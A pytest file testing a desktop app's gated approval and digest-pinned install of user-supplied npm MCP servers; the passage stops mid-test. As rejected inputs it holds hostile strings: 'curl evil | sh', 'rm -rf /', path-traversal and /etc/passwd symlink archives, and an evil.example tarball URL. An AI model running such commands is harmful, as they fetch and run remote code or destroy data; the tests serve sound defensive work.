"""Desk user-chosen MCP server, slice U2a: the common approval and a self-contained npm package
(docs/DESK_SERVICE_PROFILES_SPEC.md, sections 6.1, 6.2 and 6.5; Dave's pick, 12.3 choice 3: a
new custom server defaults to the selected project, global is an explicit opt-in).

Pinned:

  * an unknown package that no catalogue lists saves, and the bytes on disk are the bytes of the
    archive that was approved (digest-addressed directory, our marker, the entry file);
  * the card shows the exact normalized command (the same argv that is written), the pin, the
    reach and the plain risk labels, and Review writes nothing;
  * the project is the default reach; global is chosen on purpose and is fingerprinted;
  * a changed argument, credential, entry, version, digest, server name or scope is a different
    fingerprint; an old fingerprint under a new Review is a 409; the client cannot send a
    command or `approved`; a changed server that is already approved asks again and says what moved;
  * traversal, links, duplicate members, a zip bomb, too many or too large members, a slow or
    failing registry, a wrong digest and a package that needs other packages are refused with
    nothing left on disk, and nothing was run;
  * two Saves of one server, or of one package, download and place it once;
  * the older MCP write paths and the catalogue cannot overwrite, replace or shadow an approved
    server;
  * an unattended caller gets 403; a stale or wrong approval is refused before the passcode is
    tried; a wrong passcode writes nothing;
  * credentials are vault entry names only: no value in the config, the record, the card or a log;
  * a frozen build or a missing Node.js saves the approval as `pending_runtime` and the state never
    reads registered.
"""
from __future__ import annotations

import ast
import io
import json
import os
import subprocess
import sys
import tarfile
import threading
import time
from pathlib import Path

import pytest
from flask import Flask

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from mc.desk_connect import (custom_connection_activation as activation,  # noqa: E402
                             custom_connection_operation as operation,
                             custom_connection_service as service,
                             custom_connection_store as store,
                             custom_npm_artifact as artifact,
                             mcp_activation, mcp_catalogue, mcp_package_store,
                             parameter_sources)

PASSCODE = 'dash-passcode-1'
SECRET = 'PLAINTEXT-VALUE-SHOULD-NEVER-APPEAR'
PID = 'proj1'
PKG = 'fixture-mcp'
ENTRY_BODY = b'// fixture entry: nothing in the tests runs it\n'
REG = 'https://registry.npmjs.org/'


# ── fixtures ─────────────────────────────────────────────────────────────────

def _tar(members) -> bytes:
    """A gzip tarball of `(name, kind, payload)`: kind is file | dir | symlink | hardlink | fifo."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        for name, kind, payload in members:
            ti = tarfile.TarInfo(name)
            if kind == 'file':
                ti.size = len(payload)
                tf.addfile(ti, io.BytesIO(payload))
            elif kind == 'dir':
                ti.type = tarfile.DIRTYPE
                tf.addfile(ti)
            elif kind == 'fifo':
                ti.type = tarfile.FIFOTYPE
                tf.addfile(ti)
            else:
                ti.type = tarfile.SYMTYPE if kind == 'symlink' else tarfile.LNKTYPE
                ti.linkname = payload
                tf.addfile(ti)
    return buf.getvalue()


def _manifest(version='1.2.3', **over) -> bytes:
    m = {'name': PKG, 'version': version, 'bin': {PKG: 'bin/cli.mjs'}, 'license': 'MIT'}
    m.update(over)
    return json.dumps(m).encode()


def _good(version='1.2.3', **over):
    return [('package/package.json', 'file', _manifest(version, **over)), ('package/bin', 'dir', None),
            ('package/bin/cli.mjs', 'file', ENTRY_BODY + version.encode())]


def _url(version, name=PKG):
    return f'{REG}{name}/-/{name}-{version}.tgz'


class Registry:
    """The fake npm registry: version documents and tarballs by address, and what was fetched."""

    def __init__(self):
        self.tars: dict[str, bytes] = {}
        self.docs: dict[str, dict] = {}
        self.doc_fetches: list[str] = []
        self.tar_fetches: list[str] = []
        self.error = None
        self.delay = 0.0
        self.served: dict[str, bytes] = {}

    def publish(self, version='1.2.3', members=None, name=PKG, doc_over=None, stated=True):
        tar = _tar(members if members is not None else _good(version))
        self.tars[_url(version, name)] = tar
        dist = {'tarball': _url(version, name)}
        if stated:
            dist['integrity'] = mcp_package_store.integrity_of(tar)
        doc = {'name': name, 'version': version, 'dist': dist, '_npmUser': {'name': 'fixture-author'}}
        doc.update(doc_over or {})
        self.docs[f'{REG}{name}/{version}'] = doc
        return tar


@pytest.fixture()
def env(tmp_path, monkeypatch):
    monkeypatch.setenv('CLAYRUNE_HOME', str(tmp_path / '.clayrune'))
    monkeypatch.setenv('CLAYRUNE_SECRETS_KEY_BACKEND', 'file')
    monkeypatch.delenv('CLAUDE_CODE_SESSION_ID', raising=False)
    from mc import mcp, secrets_store
    from mc.blueprints import desk_connect_custom_routes as routes
    from mc.blueprints import local_auth, mcp_routes, project_routes, skills_routes
    from mc.state import agent_sessions
    monkeypatch.setattr(local_auth, 'LOCAL_AUTH_PATH', tmp_path / 'local_auth.json')
    local_auth._LOCAL_AUTH_FAILS.clear()
    secrets_store._dispensed.clear()
    secrets_store._unlocked_key = None
    secrets_store._lock_notified = False
    secrets_store._key_mismatch = False
    agent_sessions.clear()
    service._forget_all_for_tests()
    local_auth._local_auth_set_passcode(PASSCODE)

    glob_cfg = tmp_path / 'claude.json'
    monkeypatch.setattr(mcp, 'GLOBAL_CLAUDE_JSON', glob_cfg)
    proj_dir = tmp_path / 'proj'
    proj_dir.mkdir()
    projects = {PID: {'name': 'Project One', 'project_path': str(proj_dir)},
                'other': {'name': 'Other', 'project_path': str(tmp_path / 'other')}}
    (tmp_path / 'other').mkdir()
    loader = lambda pid: projects.get(pid)                              # noqa: E731
    monkeypatch.setattr(project_routes, 'load_project', loader)
    monkeypatch.setattr(skills_routes, 'load_project', loader, raising=False)
    mcp_routes.wire(load_project_fn=loader, save_project_fn=None, data_dir=tmp_path, mcp_server_catalog_fn=lambda p: None)

    reg = Registry()

    def http_get(url, timeout, max_bytes=0, **kw):
        reg.doc_fetches.append(url)
        doc = reg.docs.get(url)
        if doc is None:
            raise parameter_sources.SourceError('source_not_found', 'not found')
        return json.dumps(doc).encode()

    def fetch(url, limit, timeout):
        reg.tar_fetches.append(url)
        if reg.delay:
            time.sleep(reg.delay)
        if reg.error is not None:
            raise reg.error
        return reg.served.get(url) or reg.tars[url]

    monkeypatch.setattr(parameter_sources, 'http_get', http_get)
    monkeypatch.setattr(mcp_package_store, '_fetch', fetch)
    tools = {'node': '/fake/bin/node'}
    monkeypatch.setattr(mcp_activation, '_which', lambda n: tools.get(n))

    def boom(*a, **k):
        raise AssertionError('a process or a connection was started')
    monkeypatch.setattr(subprocess, 'Popen', boom)
    monkeypatch.setattr(os, 'system', boom)
    monkeypatch.setattr('socket.create_connection', boom)

    app = Flask(__name__)
    app.config['TESTING'] = True
    app.register_blueprint(routes.bp)
    app.register_blueprint(mcp_routes.bp)
    calls = {'n': 0}
    real = routes._require_human_passcode

    def counting(data):
        calls['n'] += 1
        return real(data)
    monkeypatch.setattr(routes, '_require_human_passcode', counting)

    class E:
        pass
    e = E()
    e.client, e.reg, e.calls, e.tools = app.test_client(), reg, calls, tools
    e.tmp, e.glob_cfg, e.proj_dir, e.home = tmp_path, glob_cfg, proj_dir, tmp_path / '.clayrune'
    e.proj_cfg = proj_dir / '.mcp.json'
    reg.publish('1.2.3')
    return e


def review(env, **over):
    body = {'package': f'{PKG}@1.2.3', 'project_id': PID}
    body.update(over)
    return env.client.post('/api/desk/connect/custom/review', json=body)


def save(env, card, passcode=PASSCODE, **over):
    body = {'request_id': card['request_id'], 'fingerprint': card['fingerprint'], 'passcode': passcode}
    body.update(over)
    return env.client.post('/api/desk/connect/custom/commit', json=body)


def approved(env, **over):
    r = review(env, **over)
    assert r.status_code == 200, r.get_json()
    card = r.get_json()
    s = save(env, card)
    assert s.status_code in (200, 201), s.get_json()
    return card, s.get_json()


def servers(path):
    return json.loads(path.read_text(encoding='utf-8')).get('mcpServers', {}) if path.exists() else {}


def packages_dir(env):
    return env.home / 'mcp_custom_packages'


def disk(env):
    root = packages_dir(env)
    return sorted(str(p.relative_to(root)).replace('\\', '/') for p in root.rglob('*')) if root.exists() else []


def nothing_written(env):
    assert not env.glob_cfg.exists() and not env.proj_cfg.exists()
    assert store.all_records() == [] and disk(env) == []


def vault_names():
    from mc import secrets_store
    return sorted(s['name'] for s in secrets_store.list_secrets())


def put_secret(name='acme.token', scope='global', **kw):
    from mc import secrets_store
    secrets_store.set_secret(name, SECRET, scope=scope, **kw)


# ── the card and the save ────────────────────────────────────────────────────

def test_an_unknown_package_saves_without_a_catalogue_entry_and_its_approved_bytes_are_on_disk(env):
    assert mcp_catalogue.for_service(PKG) is None
    approved_tar = env.reg.tars[_url('1.2.3')]
    card, out = approved(env)
    assert out['state'] == 'registered' and out['approved'] is True and out['fingerprint'] == card['fingerprint']
    cfg = servers(env.proj_cfg)[PKG]
    entry_file = Path(cfg['args'][-1])
    digest = artifact.digest_id(mcp_package_store.integrity_of(approved_tar))
    assert entry_file == packages_dir(env) / digest / 'package' / 'bin' / 'cli.mjs'
    assert entry_file.read_bytes() == ENTRY_BODY + b'1.2.3'
    marker = json.loads((packages_dir(env) / digest / artifact.VERIFIED_MARKER).read_text(encoding='utf-8'))
    assert marker['integrity'] == mcp_package_store.integrity_of(approved_tar)
    assert not env.glob_cfg.exists()                                    # project scope by default
    # one document read and one archive read at Review, the archive again at Save: nothing else
    assert env.reg.doc_fetches == [f'{REG}{PKG}/1.2.3'] and env.reg.tar_fetches == [_url('1.2.3')] * 2


def test_the_card_shows_the_exact_command_that_is_written_the_pin_and_the_reach(env):
    card, _ = approved(env)
    cfg = servers(env.proj_cfg)[PKG]
    assert card['command']['runnable'] is True
    assert [card['command']['command'], *card['command']['args']] == [cfg['command'], *cfg['args']]
    assert 'env' not in cfg and set(cfg) == {'command', 'args'}
    pkg = card['package']
    assert (pkg['version'], pkg['pinned'], pkg['entry'], pkg['licence']) == ('1.2.3', True, 'bin/cli.mjs', 'MIT')
    assert pkg['integrity'].startswith('sha512-') and pkg['source'] == _url('1.2.3')
    assert pkg['publisher'] == {'name': 'fixture-author', 'status': 'claimed'}
    assert card['reach']['scope'] == 'project' and card['reach']['project'] == {'id': PID, 'name': 'Project One'}
    assert card['origin']['label'] == 'User supplied; not reviewed by Clayrune'
    assert 'Centrally reviewed' not in json.dumps(card)
    codes = [r['code'] for r in card['risks']]
    assert {'user_supplied', 'runs_local_code', 'digest_not_safety'} <= set(codes) and 'global_reach' not in codes
    assert card['install_steps'] == [] and card['approved'] is False and card['scope_default'] == 'project'


def test_review_writes_nothing_and_runs_nothing(env):
    r = review(env)
    assert r.status_code == 200
    nothing_written(env)
    assert vault_names() == [] and env.calls['n'] == 0


def test_the_default_reach_is_the_selected_project_and_global_is_a_chosen_option(env):
    assert review(env, project_id=None).status_code == 400
    assert review(env, project_id=None).get_json()['code'] == 'project_required'
    assert review(env, project_id='missing').get_json()['code'] == 'project_not_found'
    glob = review(env, scope='global', project_id=None).get_json()
    assert glob['reach']['scope'] == 'global' and 'global_reach' in [r['code'] for r in glob['risks']]
    proj = review(env).get_json()
    assert proj['fingerprint'] != glob['fingerprint']
    out = save(env, glob).get_json()
    assert out['state'] == 'registered' and out['scope'] == 'global'
    assert PKG in servers(env.glob_cfg) and not env.proj_cfg.exists()


@pytest.mark.parametrize('over', [
    {'args': ['--read-only']}, {'server_name': 'other-name'}, {'scope': 'global', 'project_id': None},
    {'project_id': 'other'}, {'entry': 'bin/cli.mjs', 'args': ['x']},
])
def test_every_field_of_the_operation_changes_the_fingerprint(env, over):
    base = review(env).get_json()['fingerprint']
    assert review(env, **over).get_json()['fingerprint'] != base
    assert review(env).get_json()['fingerprint'] == base               # and the same Review is stable


def test_a_credential_or_a_version_or_a_digest_changes_the_fingerprint(env):
    put_secret()
    base = review(env).get_json()['fingerprint']
    with_cred = review(env, credentials=[{'env': 'ACME_TOKEN', 'vault': 'acme.token'}]).get_json()['fingerprint']
    other_env = review(env, credentials=[{'env': 'OTHER_TOKEN', 'vault': 'acme.token'}]).get_json()['fingerprint']
    env.reg.publish('1.2.4')
    v2 = review(env, package=f'{PKG}@1.2.4').get_json()['fingerprint']
    assert len({base, with_cred, other_env, v2}) == 4


def test_the_client_cannot_send_a_command_or_approve_itself(env):
    for bad in ({'command': 'curl evil | sh'}, {'approved': True}, {'install_steps': ['rm -rf /']}, {'tarball': 'https://evil/x.tgz'},
                {'integrity': 'sha512-x'}, {'version': '9.9.9'}):
        r = review(env, **bad)
        assert r.status_code == 400 and r.get_json()['code'] == 'invalid', bad
    card = review(env).get_json()
    for extra in ({'approved': True}, {'command': 'x'}, {'scope': 'global'}, {'operation': {}}):
        r = save(env, card, **extra)
        assert r.status_code == 400, extra
    nothing_written(env)


def test_an_old_fingerprint_under_a_new_review_is_a_409_before_the_passcode(env):
    first = review(env).get_json()
    second = review(env, args=['--changed']).get_json()
    r = env.client.post('/api/desk/connect/custom/commit',
                        json={'request_id': second['request_id'], 'fingerprint': first['fingerprint'], 'passcode': PASSCODE})
    assert r.status_code == 409 and r.get_json()['code'] == 'changed_since_review'
    assert env.calls['n'] == 0
    nothing_written(env)


def test_an_unknown_or_expired_review_is_refused_before_the_passcode(env):
    card = review(env).get_json()
    r = env.client.post('/api/desk/connect/custom/commit',
                        json={'request_id': 'r' * 24, 'fingerprint': card['fingerprint'], 'passcode': PASSCODE})
    assert r.status_code == 404 and r.get_json()['code'] == 'review_expired' and env.calls['n'] == 0
    for rec in service._prepared.values():
        rec['expires'] = time.monotonic() - 1
    r = save(env, card)
    assert r.status_code == 404 and env.calls['n'] == 0
    nothing_written(env)


def test_a_changed_version_asks_again_and_says_what_moved(env):
    approved(env)
    env.reg.publish('1.2.4')
    card = review(env, package=f'{PKG}@1.2.4').get_json()
    assert card['reask'] is True and card['replaces']
    moved = {c['field'] for c in card['changes']}
    assert {'version', 'package digest'} <= moved
    old_cfg = servers(env.proj_cfg)[PKG]
    assert servers(env.proj_cfg)[PKG] == old_cfg                          # nothing replaced by looking
    out = save(env, card).get_json()
    assert out['state'] == 'registered'
    assert artifact.digest_id(mcp_package_store.integrity_of(env.reg.tars[_url('1.2.4')])) in servers(env.proj_cfg)[PKG]['args'][-1]
    # the first version's directory is still there, byte for byte
    assert len([d for d in packages_dir(env).iterdir() if d.is_dir()]) == 2


def test_the_same_approval_saved_again_is_one_server_and_not_a_new_approval(env):
    card, _ = approved(env)
    again = review(env).get_json()
    assert again['reask'] is False and again['fingerprint'] == card['fingerprint']
    out = save(env, again).get_json()
    assert out['state'] == 'registered'
    assert len(store.all_records()) == 1 and list(servers(env.proj_cfg)) == [PKG]


def test_a_retry_of_a_finished_save_is_a_duplicate_not_a_second_install(env):
    card, _ = approved(env)
    n = len(env.reg.tar_fetches)
    r = save(env, card)
    assert r.status_code == 200 and r.get_json()['duplicate'] is True
    assert len(env.reg.tar_fetches) == n


# ── the package and the archive ──────────────────────────────────────────────

def _review_fails(env, tar_members, code, status=None, **kw):
    env.reg.publish('1.2.3', members=tar_members, **kw)
    r = review(env)
    assert r.status_code == (status or r.status_code) and r.get_json()['code'] == code, r.get_json()
    nothing_written(env)
    assert env.reg.tar_fetches and all(u == _url('1.2.3') for u in env.reg.tar_fetches)


@pytest.mark.parametrize('label,members', [
    ('traversal', _good() + [('package/../../evil.js', 'file', b'x')]),
    ('absolute', _good() + [('/etc/evil.js', 'file', b'x')]),
    ('outside package', _good() + [('other/evil.js', 'file', b'x')]),
    ('backslash', _good() + [('package\\evil.js', 'file', b'x')]),
    ('drive letter', _good() + [('package/C:evil.js', 'file', b'x')]),
    ('symlink', _good() + [('package/bin/link', 'symlink', '/etc/passwd')]),
    ('hardlink', _good() + [('package/bin/link', 'hardlink', 'package/package.json')]),
    ('device-like', _good() + [('package/bin/pipe', 'fifo', None)]),
    ('duplicate', _good() + [('package/bin/cli.mjs', 'file', b'second')]),
    ('too deep', _good() + [('package/' + '/'.join(['d'] * 20) + '/x.js', 'file', b'x')]),
])
def test_a_hostile_archive_is_refused_at_review_with_nothing_written(env, label, members):
    _review_fails(env, members, 'package_invalid', 502)


def test_a_package_without_a_manifest_or_with_the_wrong_name_is_refused(env):
    _review_fails(env, [('package/bin/cli.mjs', 'file', b'x')], 'package_invalid')
    _review_fails(env, _good(name='someone-else'), 'package_invalid')
    _review_fails(env, [('package/package.json', 'file', b'{not json'), ('package/bin/cli.mjs', 'file', b'x')], 'package_invalid')


def test_a_zip_bomb_is_refused_before_it_is_read_as_an_archive(env, monkeypatch):
    bomb = [('package/package.json', 'file', _manifest()), ('package/bin/cli.mjs', 'file', b'\0' * (6 * 1024 * 1024))]
    monkeypatch.setattr(artifact, 'MAX_DECOMPRESSED', 1024 * 1024)
    _review_fails(env, bomb, 'package_too_large', 413)


def test_too_many_files_or_too_much_unpacked_data_is_refused(env, monkeypatch):
    monkeypatch.setattr(artifact, 'MAX_MEMBERS', 3)
    _review_fails(env, _good() + [('package/a.js', 'file', b'1'), ('package/b.js', 'file', b'2')], 'package_too_large', 413)
    monkeypatch.setattr(artifact, 'MAX_MEMBERS', 4000)
    monkeypatch.setattr(artifact, 'MAX_UNPACKED', 100)
    _review_fails(env, _good() + [('package/big.js', 'file', b'z' * 500)], 'package_too_large', 413)


def test_the_extractor_refuses_what_review_refuses_and_leaves_nothing(env, tmp_path):
    from mc.desk_connect.mcp_errors import ActivationError
    for members in (_good() + [('package/../x', 'file', b'x')], _good() + [('package/l', 'symlink', '/x')],
                    _good() + [('package/bin/cli.mjs', 'file', b'again')]):
        dest = tmp_path / 'dest'
        dest.mkdir(exist_ok=True)
        with pytest.raises(ActivationError):
            mcp_package_store._extract(_tar(members), dest, 1 << 20, 100)
        assert not (tmp_path / 'evil').exists()
    big = _tar(_good() + [('package/a', 'file', b'1'), ('package/b', 'file', b'2')])
    with pytest.raises(ActivationError):
        mcp_package_store._extract(big, tmp_path / 'dest2', 1 << 20, 3)
    # without a member cap (the reviewed catalogue's call) the same archive extracts
    (tmp_path / 'dest3').mkdir()
    mcp_package_store._extract(big, tmp_path / 'dest3', 1 << 20)
    assert (tmp_path / 'dest3' / 'package' / 'a').is_file()


def test_a_slow_registry_is_given_up_on_and_a_failing_one_is_reported(env, monkeypatch):
    monkeypatch.setattr(artifact, 'DOWNLOAD_S', 0.2)
    env.reg.delay = 1.5
    t0 = time.monotonic()
    r = review(env)
    assert r.status_code == 504 and r.get_json()['code'] == 'download_timeout' and time.monotonic() - t0 < 1.2
    env.reg.delay, env.reg.error = 0, OSError('boom')
    r = review(env)
    assert r.status_code == 502 and r.get_json()['code'] == 'download_failed'
    nothing_written(env)


def test_a_registry_that_states_another_checksum_or_address_is_refused(env):
    env.reg.publish('1.2.3', doc_over={'dist': {'tarball': _url('1.2.3'), 'integrity': 'sha512-' + 'A' * 86 + '=='}})
    r = review(env)
    assert r.status_code == 409 and r.get_json()['code'] == 'pin_mismatch'
    env.reg.publish('1.2.3', doc_over={'dist': {'tarball': 'https://evil.example/x.tgz'}})
    r = review(env)
    assert r.get_json()['code'] == 'registry_address_unexpected'
    env.reg.publish('1.2.3', doc_over={'name': 'someone-else'})
    assert review(env).get_json()['code'] == 'registry_mismatch'
    nothing_written(env)


def test_a_package_that_needs_other_packages_installed_is_refused_not_launched(env):
    env.reg.publish('1.2.3', members=_good(dependencies={'left-pad': '^1.0.0'}))
    r = review(env)
    assert r.status_code == 422 and r.get_json()['code'] == 'needs_dependencies'
    assert 'left-pad' in r.get_json()['error'] and 'not available yet' in r.get_json()['error']
    nothing_written(env)
    bundled = _good(dependencies={'left-pad': '^1.0.0'}, bundledDependencies=['left-pad']) + \
        [('package/node_modules/left-pad/package.json', 'file', b'{}')]
    env.reg.publish('1.2.3', members=bundled)
    assert review(env).status_code == 200                                 # the dependency is inside the archive


def test_a_package_that_declares_install_scripts_lists_them_and_does_not_run_them(env):
    env.reg.publish('1.2.3', members=_good(scripts={'postinstall': 'curl evil | sh', 'test': 'x'}))
    card = review(env).get_json()
    assert card['package']['install_scripts_not_run'] == ['postinstall']
    assert card['install_steps'] == []
    assert save(env, card).get_json()['state'] == 'registered'


def test_the_start_file_is_chosen_from_files_in_the_archive(env):
    two = _good(bin={'a': 'bin/a.mjs', 'b': 'bin/b.mjs'}) + [('package/bin/a.mjs', 'file', b'a'), ('package/bin/b.mjs', 'file', b'b')]
    env.reg.publish('1.2.3', members=two)
    r = review(env)
    assert r.status_code == 422 and r.get_json()['code'] == 'entry_choice_needed'
    assert review(env, entry='bin/b.mjs').get_json()['package']['entry'] == 'bin/b.mjs'
    for bad in ('bin/missing.mjs', 'bin/a.sh', '../x.js', '/etc/x.js', 'package.json'):
        assert review(env, entry=bad).status_code in (400, 422), bad
    none = _good()
    none[0] = ('package/package.json', 'file', json.dumps({'name': PKG, 'version': '1.2.3'}).encode())
    env.reg.publish('1.2.3', members=none)
    assert review(env).get_json()['code'] == 'entry_choice_needed'


def test_a_different_file_at_save_than_the_one_approved_is_not_installed(env):
    card = review(env).get_json()
    env.reg.served[_url('1.2.3')] = _tar(_good(extra='tampered'))
    out = save(env, card).get_json()
    assert out['state'] == 'setup_failed' and out['code'] == 'pin_mismatch'
    assert disk(env) == [] and not env.proj_cfg.exists()
    assert store.all_records()[0]['state'] == 'setup_failed'
    del env.reg.served[_url('1.2.3')]
    again = save(env, card).get_json()                                   # the same approval is retried
    assert again['state'] == 'registered' and not again.get('duplicate')


def test_a_folder_that_is_not_our_verified_package_is_never_overwritten(env):
    card = review(env).get_json()
    d = packages_dir(env) / artifact.digest_id(card['package']['integrity'])
    d.mkdir(parents=True)
    (d / 'mine.txt').write_text('keep me', encoding='utf-8')
    out = save(env, card).get_json()
    assert out['state'] == 'setup_failed' and out['code'] == 'package_store_conflict'
    assert (d / 'mine.txt').read_text(encoding='utf-8') == 'keep me'


def test_two_saves_of_one_server_download_and_place_it_once(env):
    cards = [review(env).get_json(), review(env).get_json()]
    base = len(env.reg.tar_fetches)
    env.reg.delay = 0.3
    results = []

    def go(c):
        results.append(save(env, c))
    ts = [threading.Thread(target=go, args=(c,)) for c in cards]
    [t.start() for t in ts]
    [t.join() for t in ts]
    assert sorted(r.status_code for r in results) == [200, 201] or all(r.status_code in (200, 201) for r in results)
    assert all(r.get_json()['state'] == 'registered' for r in results)
    assert len(env.reg.tar_fetches) - base == 1
    assert len(store.all_records()) == 1 and list(servers(env.proj_cfg)) == [PKG]
    assert len([d for d in packages_dir(env).iterdir() if d.is_dir()]) == 1


def test_two_servers_of_one_package_share_one_placement(env):
    ops = []
    for name in ('one', 'two'):
        card = review(env, server_name=name).get_json()
        ops.append(service._prepared[card['request_id']]['op'])
    base = len(env.reg.tar_fetches)
    env.reg.delay = 0.3
    ts = [threading.Thread(target=artifact.install, args=(o,)) for o in ops]
    [t.start() for t in ts]
    [t.join() for t in ts]
    assert len(env.reg.tar_fetches) - base == 1


# ── the gates ────────────────────────────────────────────────────────────────

def test_an_agent_session_gets_403_and_nothing_is_read_or_written(env):
    from mc.state import agent_sessions
    card = review(env).get_json()
    agent_sessions['scheduled-1'] = {'status': 'running', 'trigger_type': 'scheduled', 'project_id': 'p'}
    fetched = (len(env.reg.doc_fetches), len(env.reg.tar_fetches))
    assert review(env).status_code == 403
    assert save(env, card).status_code == 403
    assert (len(env.reg.doc_fetches), len(env.reg.tar_fetches)) == fetched
    assert env.calls['n'] == 0
    nothing_written(env)


@pytest.mark.parametrize('passcode', [None, '', 'wrong', 123])
def test_a_missing_or_wrong_passcode_writes_nothing(env, passcode):
    card = review(env).get_json()
    body = {'request_id': card['request_id'], 'fingerprint': card['fingerprint']}
    if passcode is not None:
        body['passcode'] = passcode
    r = env.client.post('/api/desk/connect/custom/commit', json=body)
    assert r.status_code == 403
    nothing_written(env)
    assert save(env, card).status_code == 201                             # the right one still works afterwards


def test_a_good_save_asks_for_the_passcode_exactly_once(env):
    approved(env)
    assert env.calls['n'] == 1


def test_no_passcode_configured_refuses(env, monkeypatch):
    from mc.blueprints import local_auth
    monkeypatch.setattr(local_auth, '_local_auth_is_configured', lambda: False)
    card = review(env).get_json()
    assert save(env, card).status_code == 403
    nothing_written(env)


@pytest.mark.parametrize('body', [
    {}, {'request_id': 'short', 'fingerprint': 'sha256:' + 'a' * 64}, {'request_id': 'r' * 24, 'fingerprint': 'nope'},
    {'request_id': 'r' * 24, 'fingerprint': 'sha256:' + 'a' * 64, 'passcode': PASSCODE, 'extra': 1},
])
def test_a_save_of_the_wrong_shape_is_refused_before_the_passcode(env, body):
    assert env.client.post('/api/desk/connect/custom/commit', json=body).status_code == 400
    assert env.calls['n'] == 0


# ── credentials ──────────────────────────────────────────────────────────────

def test_credentials_are_vault_names_and_no_value_reaches_config_record_card_or_log(env, capsys):
    put_secret()
    card, out = approved(env, credentials=[{'env': 'ACME_TOKEN', 'vault': 'acme.token'}], args=['--verbose'])
    cfg = servers(env.proj_cfg)[PKG]
    assert '--env' in cfg['args'] and 'ACME_TOKEN=acme.token' in cfg['args'] and '--project' in cfg['args']
    assert 'env' not in cfg
    surfaces = json.dumps([cfg, store.all_records(), card, out]) + capsys.readouterr().out + capsys.readouterr().err
    surfaces += (env.home / 'desk_custom_connections.json').read_text(encoding='utf-8')
    assert SECRET not in surfaces
    assert card['credentials'] == [{'env': 'ACME_TOKEN', 'vault': 'acme.token',
                                    'placement': 'environment variable of the server process', 'recipient': 'the server process'}]
    assert 'secrets_to_process' in [r['code'] for r in card['risks']] and card['reach']['secrets_to'] == 'the server process'


@pytest.mark.parametrize('over,code', [
    ({'credentials': [{'env': 'ACME_TOKEN', 'vault': 'no.such.entry'}]}, 'unknown_vault_entry'),
    ({'credentials': [{'env': 'NODE_OPTIONS', 'vault': 'acme.token'}]}, 'bad_credential_env'),
    ({'credentials': [{'env': 'PATH', 'vault': 'acme.token'}]}, 'bad_credential_env'),
    ({'credentials': [{'env': 'lower', 'vault': 'acme.token'}]}, 'bad_credential_env'),
    ({'credentials': [{'env': 'A', 'vault': 'acme.token'}, {'env': 'A', 'vault': 'acme.token'}]}, 'bad_credential_env'),
    ({'credentials': [{'env': 'A', 'vault': 'acme.token', 'value': SECRET}]}, 'bad_credentials'),
    ({'credentials': 'ACME_TOKEN'}, 'bad_credentials'),
    ({'args': ['--token=sk-live-abcdefghijklmnopqrstuvwxyz123456']}, 'secret_in_args'),
    ({'args': ['bad‮arg']}, 'bad_args'),
    ({'args': [1]}, 'bad_args'),
    ({'server_name': 'bad name'}, 'bad_server_name'),
    ({'scope': 'galaxy'}, 'bad_scope'),
])
def test_a_bad_field_is_refused_before_anything_is_downloaded(env, over, code):
    put_secret()
    r = review(env, **over)
    assert r.status_code == 400 and r.get_json()['code'] == code, r.get_json()
    assert env.reg.doc_fetches == [] and env.reg.tar_fetches == []
    assert SECRET not in json.dumps(r.get_json())


def test_a_project_server_can_use_a_global_and_its_own_project_secret_but_not_another_projects(env):
    put_secret('global.one')
    put_secret('mine.one', scope=PID)
    put_secret('theirs.one', scope='other')
    ok = review(env, credentials=[{'env': 'A', 'vault': 'global.one'}, {'env': 'B', 'vault': 'mine.one'}])
    assert ok.status_code == 200
    assert review(env, credentials=[{'env': 'A', 'vault': 'theirs.one'}]).get_json()['code'] == 'unknown_vault_entry'
    assert review(env, scope='global', project_id=None,
                  credentials=[{'env': 'A', 'vault': 'mine.one'}]).get_json()['code'] == 'unknown_vault_entry'


# ── runtime limitations: pending, never a false Connected ────────────────────

def test_a_frozen_build_saves_the_approval_as_pending_and_never_reads_registered(env, monkeypatch):
    monkeypatch.setattr(sys, 'frozen', True, raising=False)
    card = review(env).get_json()
    assert card['command']['runnable'] is False and card['command']['code'] == 'wrapper_missing'
    assert 'credential wrapper' in json.dumps(card['limitations'])
    out = save(env, card).get_json()
    assert out['state'] == 'pending_runtime' and out['code'] == 'wrapper_missing' and 'Saved and approved' in out['message']
    assert not env.proj_cfg.exists() and store.all_records()[0]['state'] == 'pending_runtime'
    assert artifact.is_installed(service._prepared[card['request_id']]['op'])           # the verified package is kept
    state = service.connections(lambda pid: str(env.proj_dir))[0]
    assert state['state'] == 'pending_runtime' and state['state'] != 'registered'
    monkeypatch.setattr(sys, 'frozen', False, raising=False)
    retry = save(env, card).get_json()                                   # resolved: the same approval completes
    assert retry['state'] == 'registered'


def test_a_missing_node_saves_pending_with_the_reason(env):
    env.tools.pop('node')
    card = review(env).get_json()
    assert card['command']['runnable'] is False and card['command']['code'] == 'node_missing'
    out = save(env, card).get_json()
    assert out['state'] == 'pending_runtime' and out['code'] == 'node_missing'
    assert not env.proj_cfg.exists()


def test_a_passphrase_vault_is_registered_with_the_notice(env, monkeypatch):
    monkeypatch.setattr(mcp_activation, 'passphrase_backed', lambda: True)
    card = review(env).get_json()
    assert 'passphrase_vault' in [x['code'] for x in card['limitations']]
    out = save(env, card).get_json()
    assert out['state'] == 'registered' and out['notice'] == mcp_activation.PASSPHRASE_NOTICE


def test_the_state_is_derived_each_time_not_remembered(env):
    put_secret()
    approved(env, credentials=[{'env': 'ACME_TOKEN', 'vault': 'acme.token'}])
    path_of = lambda pid: str(env.proj_dir)                              # noqa: E731
    assert service.connections(path_of)[0]['state'] == 'registered'
    # a hand edit of the config
    cfg = json.loads(env.proj_cfg.read_text(encoding='utf-8'))
    good = json.dumps(cfg)
    cfg['mcpServers'][PKG]['args'].append('--extra')
    env.proj_cfg.write_text(json.dumps(cfg), encoding='utf-8')
    assert service.connections(path_of)[0]['state'] == 'changed'
    env.proj_cfg.write_text(good, encoding='utf-8')
    # the package directory removed
    import shutil
    for d in packages_dir(env).iterdir():
        shutil.rmtree(d)
    assert service.connections(path_of)[0]['state'] == 'package_missing'
    # the secret removed
    from mc import secrets_store
    secrets_store.delete_secret('acme.token')
    assert service.connections(path_of)[0]['state'] in ('package_missing', 'credential_missing')


# ── the older paths cannot bypass the gate ───────────────────────────────────

def test_the_mcp_panel_cannot_overwrite_replace_or_recreate_an_approved_server(env):
    approved(env)
    before = servers(env.proj_cfg)
    evil = {'transport': 'stdio', 'config': {'command': 'curl', 'args': ['evil.example']}, 'project_id': PID, 'passcode': PASSCODE}
